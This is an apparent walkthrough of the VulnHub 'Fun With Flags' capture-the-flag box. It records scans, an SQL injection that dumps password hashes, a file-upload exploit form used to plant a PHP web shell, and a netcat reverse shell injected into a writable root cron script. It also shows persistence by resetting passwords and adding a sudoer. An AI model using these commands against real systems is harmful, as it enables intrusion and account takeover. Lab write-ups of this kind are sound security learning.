# Fun With Flags!

https://www.vulnhub.com/entry/tbbt-funwithflags,437/

## Flags!

nc 192.168.1.105 1337

    FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}

Via sql injection, retrieving description from users table:

    FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}

Via strings on her secretdiary in her home folder:

    FLAG-amy{60263777358690b90e8dbe8fea6943c9}

In a file under /root, after getting a root shell:

    FLAG-leonard{17fc95224b65286941c54747704acd3e}       

Via grep on all files as root, discovered in a db file for the wordpress site:
This flag is also available if you search for 'flag' in the main wordpress site (i am dumb).

    FLAG-raz{40d17a74e28a62eac2df19e206f0987c}

After a hint from the creator, found the flag as a hidden file in penny's home dir. A base64 decode revealed:

    FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
    
The last and hardest flag, after a hint from the creator (i didn't know what rockyou was, and he said I had to do it twice):

    FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}
    
Found after getting howards zip and cracking with john the ripper to get a sketch image. Then using stegcracker to get the message out of the image, both using the rockyou word list.

## Open ports:

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
```

## Penny's password

Found in her folder under pub on the ftp server:

    pennyisafreeloader

## Penny's username on pharma site:

Found under bernadette's folder under pub on the ftp server:

    penny69

## Robots.txt on website

```
User-Agent: *
Disallow:
Disallow: /howard
Disallow: /web_shell.php
Disallow: /backdoor
Disallow: /rootflag.txt
```

## Nikto output

For `nikto -host 192.168.1.105`

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.105
+ Target Hostname:    192.168.1.105
+ Target Port:        80
+ Start Time:         2020-03-11 03:51:57 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /howard/: Directory indexing found.
+ Entry '/howard/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 4 entries which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: ef, size: 59ffb591c48f0, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3092: /private/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8071 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2020-03-11 03:53:13 (GMT-4) (76 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

For `nikto -host http://192.168.1.105/private`:

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.105
+ Target Hostname:    192.168.1.105
+ Target Port:        80
+ Start Time:         2020-03-11 03:56:26 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Cookie PHPSESSID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /private/css/: Directory indexing found.
+ OSVDB-3092: /private/css/: This might be interesting...
+ /private/login.php: Admin login page/section found.
+ 7916 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2020-03-11 03:57:54 (GMT-4) (88 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Login big pharma - SQL vector

After logging in through /private/login.php, penny69:pennyisafreeloader gets to the search page. 
Searching for `'` returns `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1`

## Using above sql injection to get password hashes

```
admin	3fc0a7acf087f549ac2b266baf94b8b1	    josh	    Dont mess with me
bobby	8cb1fb4a98b9c43b7ef208d624718778	    bob	        I like playing football.
penny69	cafa13076bb64e7f8bd480060f6b2332	    penny	    Hi I am Penny I am new here!! <3
mitsos1981	05d51709b81b7e0f1a9b6b4b8273b217	dimitris	Opa re malaka!
alicelove	e146ec4ce165061919f887b70f49bf4b	alice	    Eat Pray Love
bernadette	dc5ab2b32d9d78045215922409541ed7	bernadette  FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}
```
Using reverse hashes, 

- `admin` reverses to `qwerty123`
- `mitsos1981` reverses to `souvlaki`
- `bernadette` reverses to `howard`

The others were not reversable.

None of the above worked with ssh. They also didn't work with phpMyAdmin.

## Enumerated web dirs

Nikto and wfuzz both found:

- /howard, which contains a secret_data folder containing a joke gif and joke text file
- /javascript which gives access denied
- /music which returns 200 but nothing else
- /private leading to the website
- /phpmyadmin

/private also contains a css folder with just the base css

## dirb enumeration

DirB found a bunch of stuff, including indications /music might be a word press site.

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Mar 12 14:58:58 2020
URL_BASE: http://192.168.1.105/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.105/ ----
+ http://192.168.1.105/index.html (CODE:200|SIZE:239)                                                                                             
==> DIRECTORY: http://192.168.1.105/javascript/                                                                                                   
==> DIRECTORY: http://192.168.1.105/music/                                                                                                        
==> DIRECTORY: http://192.168.1.105/phpmyadmin/                                                                                                   
==> DIRECTORY: http://192.168.1.105/private/                                                                                                      
+ http://192.168.1.105/robots.txt (CODE:200|SIZE:112)                                                                                             
+ http://192.168.1.105/server-status (CODE:403|SIZE:301)                                                                                          
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/javascript/ ----
==> DIRECTORY: http://192.168.1.105/javascript/jquery/                                                                                            
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/ ----
+ http://192.168.1.105/music/index.html (CODE:200|SIZE:0)                                                                                         
==> DIRECTORY: http://192.168.1.105/music/wordpress/                                                                                              
                                                                                                                                                   
---- Entering directory: http://192.168.1.105/phpmyadmin/ ----                                                                                     
==> DIRECTORY: http://192.168.1.105/phpmyadmin/doc/                                                                                                
+ http://192.168.1.105/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                                                                
+ http://192.168.1.105/phpmyadmin/index.php (CODE:200|SIZE:10344)                                                                                  
==> DIRECTORY: http://192.168.1.105/phpmyadmin/js/                                                                                                 
+ http://192.168.1.105/phpmyadmin/libraries (CODE:403|SIZE:308)                                                                                    
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/                                                                                             
+ http://192.168.1.105/phpmyadmin/phpinfo.php (CODE:200|SIZE:10346)                                                                                
+ http://192.168.1.105/phpmyadmin/setup (CODE:401|SIZE:460)                                                                                        
==> DIRECTORY: http://192.168.1.105/phpmyadmin/sql/                                                                                               
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/                                                                                            
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/private/ ----
==> DIRECTORY: http://192.168.1.105/private/css/                                                                                                  
+ http://192.168.1.105/private/index.php (CODE:200|SIZE:685)                                                                                      
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/javascript/jquery/ ----
+ http://192.168.1.105/javascript/jquery/jquery (CODE:200|SIZE:284394)                                                                            
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/ ----
+ http://192.168.1.105/music/wordpress/index.php (CODE:301|SIZE:0)                                                                                
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/                                                                                     
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/                                                                                   
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-includes/                                                                                  
+ http://192.168.1.105/music/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                              
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/doc/ ----
==> DIRECTORY: http://192.168.1.105/phpmyadmin/doc/html/                                                                                          
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/js/ ----
==> DIRECTORY: http://192.168.1.105/phpmyadmin/js/jquery/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/js/transformations/                                                                                
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/ ----
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/az/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/bg/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ca/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/cs/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/da/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/de/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/el/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/es/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/et/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/fi/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/fr/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/gl/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/hu/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ia/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/id/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/it/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ja/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ko/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/lt/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/nl/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/pl/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/pt/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/pt_BR/                                                                                      
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ro/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/ru/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/si/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/sk/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/sl/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/sq/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/sv/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/tr/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/uk/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/vi/                                                                                         
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/zh_CN/                                                                                      
==> DIRECTORY: http://192.168.1.105/phpmyadmin/locale/zh_TW/                                                                                      
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/sql/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/ ----
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/components/                                                                              
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/database/                                                                                
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/error/                                                                                   
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/javascript/                                                                              
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/list/                                                                                    
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/navigation/                                                                              
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/table/                                                                                   
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/test/                                                                                    
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/themes/ ----
==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/                                                                                   
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/private/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/ ----
+ http://192.168.1.105/music/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                                       
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/css/                                                                                 
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/images/                                                                              
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/includes/                                                                            
+ http://192.168.1.105/music/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                                       
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/js/                                                                                  
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/maint/                                                                               
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/network/                                                                             
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-admin/user/                                                                                
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-content/ ----
+ http://192.168.1.105/music/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                                     
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/plugins/                                                                           
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/themes/                                                                            
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/upgrade/                                                                           
==> DIRECTORY: http://192.168.1.105/music/wordpress/wp-content/uploads/                                                                           
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/doc/html/ ----
+ http://192.168.1.105/phpmyadmin/doc/html/index.html (CODE:200|SIZE:12811)                                                                       
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/js/jquery/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/js/transformations/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/az/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/bg/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/ca/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/cs/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/da/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/de/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/el/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/es/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/et/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/fi/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/fr/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/gl/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/hu/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/ia/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/id/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/it/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/ja/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/ko/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/lt/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/nl/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/pl/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/pt/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/pt_BR/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/ro/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/ru/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/si/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/sk/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/sl/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/sq/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/sv/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/tr/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/uk/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/vi/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/zh_CN/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/locale/zh_TW/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/components/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/database/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/error/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/javascript/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/list/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/navigation/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/table/ ----
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/table/chart/                                                                             
==> DIRECTORY: http://192.168.1.105/phpmyadmin/templates/table/search/                                                                            
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/test/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/themes/original/ ----
==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/css/                                                                               
==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/img/                                                                               
==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/jquery/                                                                            
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/network/ ----
+ http://192.168.1.105/music/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                               
+ http://192.168.1.105/music/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                               
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-admin/user/ ----
+ http://192.168.1.105/music/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                  
+ http://192.168.1.105/music/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                  
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-content/plugins/ ----
+ http://192.168.1.105/music/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                             
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-content/themes/ ----
+ http://192.168.1.105/music/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                                              
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/music/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/table/chart/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/templates/table/search/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/themes/original/css/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/themes/original/img/ ----
                                                                                                                                                  
---- Entering directory: http://192.168.1.105/phpmyadmin/themes/original/jquery/ ----
==> DIRECTORY: http://192.168.1.105/phpmyadmin/themes/original/jquery/images/ 
                                                                                                                                                  
-----------------
END_TIME: Thu Mar 12 15:03:58 2020
DOWNLOADED: 332064 - FOUND: 23
```

So next step might be wpscan...

## Wp-scan and reflex gallery

After browsing around the wp site, wpscan was run. It picked up some users etc, but also a plugin called reflex-gallery 3.1.3, which has a fil upload vulnerability.

I created the following form to exploit it, based on the listed exploit on [exploitdb](https://www.exploit-db.com/exploits/36374):

```html
<form method="POST" action="http://192.168.1.105/music/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2020&Month=03" enctype="multipart/form-data" >
    <input type="file" name="qqfile"><br>
    <input type="submit" name="Submit" value="Pwn!">
</form>
```

and uploaded the php shell from here: [flozz/p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)

This gave me a shell on the machine when I browsed to it (it was under wp-content/uploads), running under www-data but which seemed to have a lot of access. Going through the user dirs, I found an exe in amy's dir that revealed a flag when run through `strings`

## Leonard's cron job

Leonards home dir had a shell script, owned by root, that was run by root every minute. And was writable.

I echoed the following command into it and got a reverse shell via netcat: `echo "nc.traditional -e /bin/bash 192.168.1.3 1235" > thermostat_set_temp.sh`, running `nc -nvlp 1235` on the kali machine. This gave me a root shell!

## Win, but wait...

With the root shell, I was in the /root dir where leonards flag file sat. This supposedly marks the win condition:

```
                         ____                                                                                                                      
                        /    \                                                                                                                     
                       /______\                                                                                                                    
                          ||                                                                                                                       
           /~~~~~~~~\     ||    /~~~~~~~~~~~~~~~~\                                                                                                 
          /~ () ()  ~\    ||   /~ ()  ()  () ()  ~\                                                                                                
         (_)========(_)   ||  (_)==== ===========(_)                                                                                               
          I|_________|I  _||_  |___________________|                                                                                               
.////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\                                                                                     
                                                                                                                                                   
Gongrats!                                                                                                                                          
You have rooted the box! Now you can sit on Sheldons spot!                                                                                         
FLAG-leonard{17fc95224b65286941c54747704acd3e}           
```

However I am still missing three flags...

## Getting a better shell

The nc shell is a bit limited. Not a lot of feedback from commands. Particularly, I wanted to get more persistence, by changing the password for an existing user and making that user a sudoer, before logging in as said user via ssh.

This command from my nc reverse shell gave me a real nice terminal: `python -c 'import pty; pty.spawn("/bin/bash")'`. It creates a pseudo terminal that worked great.

I then changed penny's password to `hacktheplanet` via `passwd penny`, and made her a sudoer via `/usr/sbin/usermod -aG sudo penny`. Finally I logged in with her over ssh, then did a `sudo -i` to get a nice, clean root shell :)

## Deeper access to footprints on the moon

Raz's flag is in the wp blog, so I decided to get in there. Step 1, Find the db by cat wp-config.php. 2, connect to db using the mysql command-line tool. Step 3, update the main users password using `UPDATE `wp_users` SET `user_pass` = MD5( 'hacktheplanet' ) WHERE `wp_users`.`user_login` = "footprintsonthemoon";`, step 4, login to admin dashboard.

Via this I was able to find a page list that included a page called 'secret', containing raj's flag.

## Creator's hints

The creator DM'd me some hints, including that 'penny likes to hide her files'. I found Penny's flag as a hidden file in her home dir, base64 encoded. The second hint was for howard's flag, where the creator first suggested it was in his zip file on ftp (which i already guessed) then that I might need to 'rockyou' it twice.

I looked around word press thinking this was some show reference, but then did a google and found its actually the name of a common word list on kali, a 130+ meg list of common passwords. I used it with john the ripper to crack the zip, allowing me to extract an image of the mars rover. john used rockyou and ran in half a second to get the password `astronaut`

The image had nothing in it that I could see for the flag, but given that it was the only thing in the file, that I was sure the flag was in it somewhere, and that the author had said I need to rockyou twice (crack two passwords) I guessed that it was a stegographic image. `steghide` is a tool that will encode and decode messages in images, however, it requires a passphrase to decode. After some googling I found `stegcracker`, a tool that will brute force using a word list and steghide. And the word list defaults to using rockyou again :)

stegcracker was much, much slower than john, but fortunately it found the password after a few minutes in the first 0.3% of rockyou's passwords, `iloveyoumom`. The output file contained the final flag.